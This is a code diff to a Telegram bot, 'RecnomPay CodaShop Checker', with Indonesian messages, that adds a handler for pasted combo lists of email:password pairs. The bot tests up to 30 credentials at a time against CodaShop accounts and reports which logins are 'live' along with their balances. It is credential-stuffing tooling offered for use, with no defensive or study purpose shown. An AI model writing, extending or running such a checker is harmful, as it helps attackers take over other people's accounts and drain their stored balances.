@@ -61,14 +61,14 @@ async function checkAccount(username, password) {
 // HANDLER: /START & /CODASHOP (Satuan)
 // ==========================================
 bot.start((ctx) => {
-  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal: Langsung kirim/upload file .txt ke bot ini.');
+  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal File: Upload file .txt\n🔹 Cek Massal Teks: Langsung paste list combo ke chat ini.');
 });
 
 bot.command('codashop', async (ctx) => {
   const args = ctx.message.text.split(' ');
   
   if (args.length < 2) {
-    return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung upload file .txt</b> ke chat ini.', { parse_mode: 'HTML' });
+    return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung paste list akun</b> ke chat ini.', { parse_mode: 'HTML' });
   }
 
   const combo = args[1].replace(/[|;\s]/g, ':').split(':');
@@ -96,6 +96,66 @@ bot.command('codashop', async (ctx) => {
 });
 
 // ==========================================
+// HANDLER: PASTE TEKS LANGSUNG (Mass Check - Limit 30)
+// ==========================================
+bot.on('text', async (ctx) => {
+  const textData = ctx.message.text;
+
+  // Abaikan pesan jika berawalan '/' (karena itu command bot)
+  if (textData.startsWith('/')) return;
+
+  const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+  
+  // Abaikan pesan jika bukan format combo list (tidak ada titik dua)
+  if (lines.length === 0) return;
+
+  const loadingMsg = await ctx.reply('📥 <i>List teks diterima! Memulai Mass Check... (Maksimal 30 data)</i>', { parse_mode: 'HTML' });
+
+  try {
+    const maxLines = lines.slice(0, 30);
+    let liveResult = '';
+    let liveCount = 0;
+    let dieCount = 0;
+
+    const checkPromises = maxLines.map(async (line) => {
+      const combo = line.replace(/[|;\s]/g, ':').split(':');
+      if (combo.length >= 2) {
+        const username = combo[0].trim();
+        const password = combo[1].trim();
+        const res = await checkAccount(username, password);
+        return { username, password, res };
+      }
+      return null;
+    });
+
+    const results = await Promise.all(checkPromises);
+
+    results.forEach(item => {
+      if (item && item.res.status === 'live') {
+        liveCount++;
+        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
+      } else if (item) {
+        dieCount++;
+      }
+    });
+
+    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
+    if (liveCount > 0) {
+      finalMsg += liveResult;
+    } else {
+      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
+    }
+    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;
+
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });
+
+  } catch (error) {
+    console.error(error);
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses teks. Timeout Vercel atau proxy terputus.');
+  }
+});
+
+// ==========================================
 // HANDLER: UPLOAD FILE .TXT (Mass Check - Limit 30)
 // ==========================================
 bot.on('document', async (ctx) => {
@@ -105,7 +165,7 @@ bot.on('document', async (ctx) => {
     return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
   }
 
-  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check... (Maksimal 30 data agar Vercel tidak error)</i>', { parse_mode: 'HTML' });
+  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check... (Maksimal 30 data)</i>', { parse_mode: 'HTML' });
 
   try {
     const fileLink = await ctx.telegram.getFileLink(doc.file_id);
@@ -117,7 +177,6 @@ bot.on('document', async (ctx) => {
       return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid di dalam file.');
     }
 
-    // Limit ketat di angka 30 agar stabil di Vercel
     const maxLines = lines.slice(0, 30);
     let liveResult = '';
     let liveCount = 0;
